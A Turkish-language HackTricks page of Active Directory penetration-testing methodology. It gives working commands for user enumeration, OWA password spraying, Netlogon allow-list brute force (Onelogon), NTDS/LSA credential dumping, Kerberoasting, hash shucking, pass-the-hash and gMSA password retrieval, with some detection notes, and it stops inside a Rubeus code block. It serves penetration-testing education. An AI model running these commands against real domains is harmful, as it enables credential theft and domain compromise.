# Active Directory Metodolojisi

{{#include ../../banners/hacktricks-training.md}}

## Temel genel bakış

**Active Directory**, **network yöneticilerinin** bir network içindeki **domain'leri**, **kullanıcıları** ve **objeleri** verimli bir şekilde oluşturup yönetmesini sağlayan temel bir teknolojidir. Ölçeklenebilir olacak şekilde tasarlanmıştır; çok sayıda kullanıcının yönetilebilir **group** ve **subgroup**'lar hâlinde organize edilmesini ve çeşitli seviyelerde **erişim haklarının** kontrol edilmesini kolaylaştırır.

**Active Directory** yapısı üç ana katmandan oluşur: **domain'ler**, **tree'ler** ve **forest'ler**. Bir **domain**, ortak bir veritabanını paylaşan **kullanıcılar** veya **cihazlar** gibi objelerden oluşan bir koleksiyondur. **Tree'ler**, ortak bir yapı üzerinden birbirine bağlanan bu domain gruplarıdır; **forest** ise **trust relationship**'ler aracılığıyla birbirine bağlanmış birden fazla tree'nin koleksiyonunu temsil eder ve organizasyon yapısının en üst katmanını oluşturur. Bu seviyelerin her birinde belirli **erişim** ve **iletişim hakları** atanabilir.

**Active Directory** içindeki temel kavramlar şunlardır:

1. **Directory** – Active Directory objelerine ilişkin tüm bilgileri barındırır.
2. **Object** – **kullanıcılar**, **group'lar** veya **paylaşılan klasörler** dâhil olmak üzere directory içindeki varlıkları ifade eder.
3. **Domain** – Directory objeleri için bir container görevi görür; bir **forest** içinde birden fazla domain bulunabilir ve her biri kendi obje koleksiyonunu korur.
4. **Tree** – Ortak bir root domain'i paylaşan domain gruplarıdır.
5. **Forest** – Active Directory'deki organizasyon yapısının zirvesidir ve aralarında **trust relationship** bulunan birden fazla tree'den oluşur.

**Active Directory Domain Services (AD DS)**, bir network içindeki merkezi yönetim ve iletişim için kritik olan çeşitli servisleri kapsar. Bu servisler şunlardır:

1. **Domain Services** – Veri depolamayı merkezileştirir ve **kullanıcılar** ile **domain'ler** arasındaki etkileşimleri yönetir; **authentication** ve **search** işlevlerini de içerir.
2. **Certificate Services** – Güvenli **digital certificate**'ların oluşturulmasını, dağıtılmasını ve yönetilmesini denetler.
3. **Lightweight Directory Services** – **LDAP protocol** aracılığıyla directory özellikli uygulamaları destekler.
4. **Directory Federation Services** – Kullanıcıların tek bir session içinde birden fazla web uygulamasında kimlik doğrulaması yapmasını sağlayan **single-sign-on** yetenekleri sunar.
5. **Rights Management** – Telif hakkıyla korunan materyallerin izinsiz dağıtımını ve kullanımını düzenleyerek korunmasına yardımcı olur.
6. **DNS Service** – **domain name**'lerin çözümlemesi için kritik öneme sahiptir.

Daha ayrıntılı bir açıklama için şuraya bakın: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Kimlik Doğrulaması**

Bir **AD'ye attack** gerçekleştirmeyi öğrenmek için **Kerberos authentication process**'ini gerçekten iyi **anlamanız** gerekir.\
[**Nasıl çalıştığını hâlâ bilmiyorsanız bu sayfayı okuyun.**](kerberos-authentication.md)

## Cheat Sheet

Bir AD üzerinde çalıştırabileceğiniz enumeration/exploit command'larını hızlıca görmek için [https://wadcoms.github.io/](https://wadcoms.github.io) adresine bakabilirsiniz.

> [!WARNING]
> Kerberos iletişimi normalde **fully qualified domain name (FQDN)** gerektirir; böylece client doğru SPN için bir ticket alabilir. Bir makineye IP adresiyle erişmek, genellikle Kerberos yerine NTLM'e fallback yapılmasına neden olur.

## Recon Active Directory (Credentials/session olmadan)

Bir AD environment'ına erişiminiz varsa ancak herhangi bir credential/session'a sahip değilseniz şunları yapabilirsiniz:

- **Network üzerinde pentest gerçekleştirin:**
- Network'ü scan edin, makineleri ve açık port'ları bulun ve **vulnerability'leri exploit etmeyi** veya bunlardan **credential'ları çıkarmayı** deneyin (örneğin, [**printer'lar oldukça ilgi çekici hedefler olabilir**](ad-information-in-printers.md)).
- DNS enumeration, domain içindeki web, printer, share, vpn, media vb. önemli server'lar hakkında bilgi sağlayabilir.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Bunun nasıl yapılacağı hakkında daha fazla bilgi edinmek için Genel [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md)'ye bakın.
- **smb service'lerinde null ve Guest access olup olmadığını kontrol edin** (bu, modern Windows version'larında çalışmaz):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Bir SMB server'ını enumerate etmeye ilişkin daha ayrıntılı bir guide'ı burada bulabilirsiniz:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Ldap enumerate edin**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP'ı nasıl enumerate edeceğinize ilişkin daha ayrıntılı bir guide'ı burada bulabilirsiniz (**anonymous access**'e özellikle **dikkat edin**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Network'ü poison edin**
- [**Responder ile service'leri impersonate ederek**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) credential'ları toplayın
- [**relay attack'i abuse ederek**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) host'a erişin
- [**evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) ile **fake UPnP service'leri expose ederek** credential'ları toplayın
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Internal document'lar, social media, domain environment'ları içindeki service'ler (özellikle web) ve ayrıca public olarak erişilebilen kaynaklardan username/name'leri çıkarın.
- Şirket çalışanlarının tam adlarını bulursanız farklı AD **username convention**'larını (**[**burayı okuyun**](https://activedirectorypro.com/active-directory-user-naming-convention/)) deneyebilirsiniz. En yaygın convention'lar şunlardır: _NameSurname_, _Name.Surname_, _NamSur_ (her birinden 3 harf), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random harf ve 3 random sayı_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) ve [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) sayfalarını inceleyin.
- **Kerbrute enum**: **geçersiz bir username istendiğinde** server, _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ **Kerberos error** code'unu kullanarak yanıt verir; bu da username'in geçersiz olduğunu belirlememizi sağlar. **Geçerli username'ler**, ya bir AS-REP response içindeki **TGT**'yi ya da kullanıcının pre-authentication gerçekleştirmesi gerektiğini belirten _KRB5KDC_ERR_PREAUTH_REQUIRED_ error'unu döndürür.
- **MS-NRPC'ye karşı Authentication olmadan**: Domain controller'lar üzerindeki MS-NRPC (Netlogon) interface'ine auth-level = 1 (No authentication) kullanarak. Method, herhangi bir credential olmadan kullanıcının veya computer'ın var olup olmadığını kontrol etmek için MS-NRPC interface'ine binding yaptıktan sonra `DsrGetDcNameEx2` function'ını çağırır. [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool'u bu tür enumeration'ı uygular. Araştırmaya [buradan](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> ulaşabilirsiniz.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ağda bu sunuculardan birini bulduysanız, buna karşı **user enumeration** da gerçekleştirebilirsiniz. Örneğin [**MailSniper**](https://github.com/dafthack/MailSniper) aracını kullanabilirsiniz:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Kullanıcı adlarının listelerini [**bu github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) ve bu repoda ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) bulabilirsiniz.
>
> Ancak bundan önce gerçekleştirmeniz gereken recon adımında **şirkette çalışan kişilerin adlarına** sahip olmalısınız. Ad ve soyad bilgileriyle, olası geçerli kullanıcı adları oluşturmak için [**namemash.py**](https://gist.github.com/superkojiman/11076951) script'ini kullanabilirsiniz.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

DC üzerinde **Zerologon** yamalanmış olsa bile, açıkça allow-list'e alınmış hesaplar hâlâ **legacy/vulnerable Netlogon secure-channel davranışına** maruz kalabilir. Riskli yapılandırma, **`Domain controller: Allow vulnerable Netlogon secure channel connections`** GPO'su veya buna karşılık gelen **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`** registry değeridir.

Bu değer bir **SDDL security descriptor**'ıdır (bkz. [Security Descriptors](security-descriptors.md)). DACL içinde ilgili ACE ile yetki verilen herhangi bir hesap veya grup hedef alınabilir. Örneğin, `O:BAG:BAD:(A;;RC;;;WD)` ifadesi **Everyone** grubunu fiilen allow-list'e alır.

Pratik operator iş akışı:

1. **SYSVOL/GPO** ve **live DC registry**'yi kontrol ederek allow-list'e alınmış principal'ları belirleyin.
2. SDDL içinde bulunan SID'leri gerçek AD kullanıcılarına/bilgisayarlarına çözümleyin ve **DC machine accounts**, **trust accounts** ve diğer ayrıcalıklı makineleri önceliklendirin.
3. Allow-list'e alınmış hesap olarak tekrar tekrar **MS-NRPC / Netlogon authentication** deneyin.
4. Başarılı bir tahminden sonra, hedef hesap parolasını sıfırlamak için **Netlogon password-setting** özelliğini abuse edin (public PoC parolayı boş bir string olarak ayarlar).<sup>[[9]](#references)[[10]](#references)</sup>

Public artifact'tan hızlı triage / lab örnekleri:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notlar:

- **scanner**, etkin allow-list'in **SYSVOL**'de, **registry**'de veya her ikisinde bulunabilmesi nedeniyle kullanışlıdır.
- Vulnerable bir hesap tespit edildikten sonra exploit path'in kendisi önemlidir; çünkü **Domain Admin privileges** gerektirmez.
- `DC$` gibi bir **Domain Controller machine account**'unun ele geçirilmesi özellikle tehlikelidir; çünkü bu parolanın sıfırlanması, doğrudan daha geniş **AD takeover** yollarını etkinleştirebilir.
- **Brute-force feasibility**, moda bağlıdır: herkese açık artifact, meet-in-the-middle yaklaşımını, başka bir computer account mevcut olduğunda **24-bit** brute force'u ve daha yavaş **32-bit** varyantlarını açıklar.

Detection / hardening notları:

- Allow-list policy'yi denetleyin ve temporary, açıkça gerekli compatibility exceptions dışındaki her şeyi kaldırın.
- Vulnerable Netlogon connections'larının reddedildiğini, keşfedildiğini veya policy tarafından açıkça allow edildiğini yakalamak için DC **System** events **5827/5828/5829/5830/5831** olaylarını izleyin.
- `VulnerableChannelAllowList` içindeki hesapları, legacy dependency kaldırılana kadar **high-risk** olarak değerlendirin.

### Bir veya birkaç username bilmek

Tamam, geçerli bir username'iniz olduğunu ancak password'larınız olmadığını biliyorsunuz... O zaman şunları deneyin:

- [**ASREPRoast**](asreproast.md): Bir user'da _DONT_REQ_PREAUTH_ attribute'u **yoksa**, o user için user'ın password'undan türetilen bir değerle şifrelenmiş bazı veriler içeren bir **AS_REP message** **request edebilirsiniz**.
- [**Password Spraying**](password-spraying.md): Keşfedilen user'ların her biriyle en **common passwords**'ları deneyelim; belki bir user kötü bir password kullanıyordur (password policy'yi göz önünde bulundurun!).
- User'ların mail server'larına erişim elde etmeyi denemek için **OWA servers**'a da **spray** uygulayabileceğinizi unutmayın.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Aşağıdaki **network** protokollerinden bazılarına **poisoning** uygulayarak crack edilebilecek challenge **hashes**'leri **obtain** edebilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration; username'ler, email identifier'ları ve naming pattern'leri, candidate host'lar ve authentication yapmaya zorlanabilecek services sağlar. Bu bağlamı, uygun NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) ile AD environment'ına yönelik potential path'leri belirlemek için kullanın.

### NetExec workspace-driven recon & relay posture checks

- Engagement başına AD recon state'ini korumak için **`nxcdb` workspaces** kullanın: `workspace create <name>`, `~/.nxc/workspaces/<name>` altında protocol başına SQLite DB'leri (smb/mssql/winrm/ldap/etc) oluşturur. `proto smb|mssql|winrm` ile görünümleri değiştirin ve `creds` ile toplanan secret'ları listeleyin. İşiniz bittiğinde sensitive data'yı manuel olarak silin: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`** ile hızlı subnet discovery; **domain**, **OS build**, **SMB signing requirements** ve **Null Auth** bilgilerini gösterir. `(signing:False)` gösteren member'lar **relay-prone**'dır; DC'ler ise genellikle signing gerektirir.
- Targeting'i kolaylaştırmak için NetExec output'undan doğrudan **/etc/hosts** içine hostname'ler oluşturun:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- **SMB relay to the DC**, signing nedeniyle engellendiğinde bile **LDAP** durumunu kontrol edin: `netexec ldap <dc>`, `(signing:None)` / zayıf channel binding değerlerini öne çıkarır. SMB signing zorunlu olan ancak LDAP signing devre dışı bırakılmış bir DC, **SPN-less RBCD** gibi kötüye kullanımlar için hâlâ uygun bir **relay-to-LDAP** hedefidir.

### Client-side printer credential leaks → toplu domain credential validation

- Yazıcı/web arayüzleri bazen maskelenmiş admin password'lerini HTML içine gömer. Kaynağı/devtools'u görüntülemek cleartext'i (ör. `<input value="<password>">`) ortaya çıkarabilir ve scan/print repository'lerine Basic-auth erişimi sağlayabilir.
- Alınan print job'ları, kullanıcı başına password içeren **plaintext onboarding dokümanları** barındırabilir. Test sırasında eşleştirmeleri koruyun:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### NTLM Creds Çalma

**null veya guest user** ile **diğer PC'lere veya share'lere erişebiliyorsanız**, bir şekilde erişildiğinde size karşı **bir NTLM authentication'ı tetikleyecek** dosyalar (SCF file gibi) **yerleştirebilir** ve böylece kırmak üzere **NTLM challenge'ını çalabilirsiniz**:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**, zaten sahip olduğunuz her NT hash'i, key material'ı doğrudan NT hash'ten türetilen daha yavaş formatlar için bir candidate password olarak ele alır. Kerberos RC4 ticket'ları, NetNTLM challenge'ları veya cached credentials içindeki uzun passphrase'leri brute-force etmek yerine, NT hash'lerini Hashcat'in NT-candidate mode'larına besler ve plaintext'i hiç öğrenmeden password reuse durumunu doğrulamasını sağlarsınız. Bu yöntem, binlerce güncel ve geçmiş NT hash'i toplayabildiğiniz bir domain compromise sonrasında özellikle etkilidir.<sup>[[5]](#references)</sup>

Şu durumlarda shucking kullanın:

- DCSync, SAM/SECURITY dump'ları veya credential vault'larından elde edilmiş bir NT corpus'unuz varsa ve başka domain/forest'larda reuse durumunu test etmeniz gerekiyorsa.
- RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM response'ları veya DCC/DCC2 blob'ları yakalarsanız.
- Uzun ve crack edilemez passphrase'lerde reuse durumunu hızlıca kanıtlamak ve Pass-the-Hash ile hemen pivot yapmak istiyorsanız.

Bu technique, key'leri NT hash olmayan encryption type'lara karşı **çalışmaz** (ör. Kerberos etype 17/18 AES). Bir domain AES-only uyguluyorsa regular password mode'larına dönmeniz gerekir.

#### NT hash corpus oluşturma

- **DCSync/NTDS** – Mümkün olan en büyük NT hash setini (ve önceki değerlerini) history ile almak için `secretsdump.py` kullanın:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entry'leri candidate pool'u önemli ölçüde genişletir, çünkü Microsoft account başına 24 adede kadar önceki hash saklayabilir. NTDS secret'larını toplamanın diğer yolları için bkz.:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dump'ları** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (veya Mimikatz `lsadump::sam /patch`), local SAM/SECURITY verilerini ve cached domain logon'larını (DCC/DCC2) çıkarır. Bu hash'lerin duplicate'lerini kaldırın ve aynı `nt_candidates.txt` listesine ekleyin.
- **Metadata'yı takip edin** – Her hash'i oluşturan username/domain bilgisini koruyun (wordlist yalnızca hex içerse bile). Hash'ler eşleştiğinde, Hashcat kazanan candidate'i yazdırır yazdırmaz hangi principal'ın password reuse yaptığını anlarsınız.
- Shucking sırasında overlap olasılığını en üst düzeye çıkarmak için aynı forest'tan veya trusted forest'tan gelen candidate'leri tercih edin.

#### Hashcat NT-candidate mode'ları

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notlar:

- NT-candidate input'ları **raw 32-hex NT hash'leri olarak kalmalıdır**. Rule engine'lerini devre dışı bırakın (`-r` kullanmayın, hybrid mode'larını kullanmayın), çünkü mangling candidate key material'ını bozar.
- Bu mode'lar doğal olarak daha hızlı değildir, ancak NTLM keyspace'i (M3 Max üzerinde yaklaşık 30.000 MH/s), Kerberos RC4'ten (yaklaşık 300 MH/s) yaklaşık 100 kat daha hızlıdır. Curated bir NT listesiyle test yapmak, yavaş formatta tüm password space'i taramaktan çok daha ucuzdur.
- Her zaman **latest Hashcat build**'ini çalıştırın (`git clone https://github.com/hashcat/hashcat && make install`), çünkü 31500/31600/35300/35400 mode'ları kısa süre önce eklendi.<sup>[[7]](#references)</sup>
- Şu anda AS-REQ Pre-Auth için NT mode'u yoktur ve AES etype'ları (19600/19700), key'leri raw NT hash'lerinden değil UTF-16LE password'lerden PBKDF2 aracılığıyla türetildiği için plaintext password gerektirir.

#### Örnek – Kerberoast RC4 (mode 35300)

1. Düşük yetkili bir user ile hedef SPN için bir RC4 TGS yakalayın (ayrıntılar için Kerberoast sayfasına bakın):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Ticket'ı NT listenizle shuck edin:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat, her NT candidate'ten RC4 key'ini türetir ve `$krb5tgs$23$...` blob'unu doğrular. Bir eşleşme, service account'un mevcut NT hash'lerinizden birini kullandığını doğrular.

3. PtH ile hemen pivot yapın:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Gerekirse plaintext'i daha sonra `hashcat -m 1000 <matched_hash> wordlists/` ile elde edebilirsiniz.

#### Örnek – Cached credentials (mode 31600)

1. Compromised bir workstation'dan cached logon'ları dump edin:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. İlginç domain user'a ait DCC2 satırını `dcc2_highpriv.txt` dosyasına kopyalayın ve shuck edin:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Başarılı bir eşleşme, listenizde zaten bilinen NT hash'ini verir ve cached user'ın bir password reuse yaptığını kanıtlar. Bunu doğrudan PtH için (`nxc smb <dc_ip> -u highpriv -H <hash>`) kullanın veya string'i elde etmek için fast NTLM mode'unda brute-force edin.

Aynı workflow NetNTLM challenge-response'ları (`-m 27000/27100`) ve DCC (`-m 31500`) için de geçerlidir. Bir eşleşme belirlendiğinde relay, SMB/WMI/WinRM PtH başlatabilir veya NT hash'ini masks/rules ile offline olarak yeniden crack edebilirsiniz.



## Credentials/session ile Active Directory Enumerating

Bu phase için geçerli bir domain account'un **credentials'ını veya session'ını compromise etmiş** olmanız gerekir. Geçerli credentials'larınız veya domain user olarak bir shell'iniz varsa, **daha önce verilen seçeneklerin diğer user'ları compromise etmek için hâlâ geçerli olduğunu** unutmayın.

Authenticated enumeration'a başlamadan önce **Kerberos double-hop problem**'ini anlayın.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Bir account'u compromise etmek, **domain'i değerlendirme yolunda önemli bir adımdır**, çünkü authenticated **Active Directory enumeration** yapmanızı sağlar:

[**ASREPRoast**](asreproast.md) ile ilgili olarak artık vulnerable olabilecek tüm user'ları bulabilir; [**Password Spraying**](password-spraying.md) ile ilgili olarak ise **tüm username'lerin listesini** elde edebilir ve compromised account'un password'ünü, boş password'leri ve yeni umut verici password'leri deneyebilirsiniz.

- [**Temel recon gerçekleştirmek için CMD'yi kullanabilirsiniz**](../basic-cmd-for-pentesters.md#domain-info)
- Daha stealthy olacak [**recon için powershell de kullanabilirsiniz**](../basic-powershell-for-pentesters/index.html)
- Daha ayrıntılı bilgi çıkarmak için [**powerview kullanabilirsiniz**](../basic-powershell-for-pentesters/powerview.md)
- Active Directory'de recon için başka harika bir tool da [**BloodHound**](bloodhound.md)'dur. **Çok stealthy değildir** (kullandığınız collection method'larına bağlı olarak), ancak **bunu önemsemiyorsanız** kesinlikle denemelisiniz. User'ların nerede RDP yapabildiğini, diğer group'lara giden path'leri vb. bulun.
- **Diğer automated AD enumeration tool'ları:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- İlginç bilgiler içerebilecek [**AD'nin DNS record'ları**](ad-dns-records.md).
- Directory'yi enumerate etmek için kullanabileceğiniz **GUI'ye sahip bir tool**, **SysInternal** Suite içindeki **AdExplorer.exe**'dir.
- Credentials'ları _userPassword_ ve _unixUserPassword_ field'larında, hatta _Description_ içinde aramak için **ldapsearch** ile LDAP database'inde de arama yapabilirsiniz. Diğer method'lar için PayloadsAllTheThings üzerindeki [Password in AD User comment](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) sayfasına bakın.
- **Linux** kullanıyorsanız domain'i [**pywerview**](https://github.com/the-useless-one/pywerview) ile de enumerate edebilirsiniz.
- Şu automated tool'ları da deneyebilirsiniz:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Tüm domain user'larını çıkarma**

Windows'tan tüm domain username'lerini almak çok kolaydır (`net user /domain` ,`Get-DomainUser` veya `wmic useraccount get name,sid`). Linux'ta şunları kullanabilirsiniz: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` veya `enum4linux -a -u "user" -p "password" <DC IP>`

> Bu Enumeration bölümü küçük görünse bile tüm sürecin en önemli kısmıdır. Linklere (özellikle cmd, powershell, powerview ve BloodHound linklerine) erişin, bir domain'i nasıl enumerate edeceğinizi öğrenin ve kendinizi rahat hissedene kadar pratik yapın. Bir assessment sırasında DA'ya ulaşmanın yolunu bulmak veya hiçbir şey yapılamayacağına karar vermek için kilit an burası olacaktır.

### Predictable pre-created computer accounts -> gMSA password access

Legacy join'ler için önceden oluşturulmuş computer account'ları tahmin edilebilir bir initial password saklayabilir. NetExec'in `pre2k` module'ü karakteristik `userAccountControl` değerini `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) belirler ve sondaki `$` olmadan, lowercase computer name'in ilk 14 karakteriyle bir Kerberos TGT dener. Bu UAC değerini, yalnızca **Pre-Windows 2000 Compatible Access** üyeliğinin password'ün weak olduğunu kanıtladığını varsaymak yerine bir candidate selector olarak değerlendirin.<sup>[[18]](#references)[[20]](#references)</sup>

Candidate'leri test etmek ve başarılı TGT'leri kaydetmek için authenticated LDAP enumeration kullanın. `ALL=True`, test kapsamını default `4128` filter'ına sahip object'lerin ötesine genişletir.<sup>[[18]](#references)</sup>
```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```
Başarısız bir varsayılan/NTLM bind işlemi bu bulguyu **geçersiz kılmaz**: `-k`, DC'ye çözümlenen bir FQDN ve KDC ile senkronize edilmiş bir saat kullanarak test edin. Başarılı module çalıştırmaları aday listelerini ve elde edilen ccach'leri `~/.nxc/modules/pre2k/` altında yazar.<sup>[[18]](#references)[[20]](#references)</sup>

Computer principal'i ele geçirdikten sonra, iç içe geçmiş grup üyeliklerini ve dışa dönük haklarını grafiğe dökün. Özellikle, bir gMSA'nın `msDS-GroupMSAMembership` security descriptor'ında adı geçen principal'lar `msDS-ManagedPassword` değerini okuyabilir; NetExec'in `--gmsa` çıktısı izin verilen principal'ları gösterir ve kimlik doğrulayan computer yetkilendirildiğinde mevcut NT hash'ini döndürür.<sup>[[19]](#references)[[20]](#references)</sup>
```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```
Ardından kurtarılan gMSA'yı diğer kimlik bilgileri gibi değerlendirin: pass-the-hash denemeden önce yerel/domain grup üyeliğini, logon haklarını, SPN'leri, delegation'ı ve erişilebilir servisleri inceleyin. Bu ACL tabanlı retrieval yolu, KDS root-key compromise sonrasında managed password'ları türeten [Golden gMSA/dMSA](golden-dmsa-gmsa.md)'dan farklıdır.<sup>[[20]](#references)</sup>

### Kerberoast

Kerberoasting, user account'lara bağlı servisler tarafından kullanılan **TGS tickets**'ların elde edilmesini ve user password'larına dayalı encryption'larının **offline** olarak crack edilmesini içerir.

Bununla ilgili daha fazla bilgi:


{{#ref}}
kerberoast.md
{{#endref}}

### Uzak bağlantı (RDP, SSH, FTP, Win-RM vb.)

Bazı credential'ları elde ettikten sonra herhangi bir **machine**'a erişiminiz olup olmadığını kontrol edebilirsiniz. Bunun için port scans sonuçlarınıza göre farklı protokollerle birkaç server'a bağlanmayı denemek üzere **CrackMapExec** kullanabilirsiniz.

### Local Privilege Escalation

Compromised credential'lara veya regular domain user olarak bir session'a sahipseniz ve **domain'deki herhangi bir machine**'a erişebiliyorsanız, **local olarak privilege escalation yapmak ve credential toplamak** için bir yol arayın. Local administrator privileges, memory'den (LSASS) ve local storage'dan (SAM) **diğer user'ların hash'lerini dump etmenize** olanak sağlayabilir.

Bu kitapta [**Windows'ta local privilege escalation**](../windows-local-privilege-escalation/index.html) hakkında eksiksiz bir sayfa ve bir [**checklist**](../checklist-windows-privilege-escalation.md) bulunmaktadır. Ayrıca [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kullanmayı unutmayın.

### Mevcut Session Tickets

Mevcut user'ın size beklenmedik kaynaklara **erişim izni veren** **ticket**'larını bulmanız çok **düşük bir ihtimaldir**, ancak şunları kontrol edebilirsiniz:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
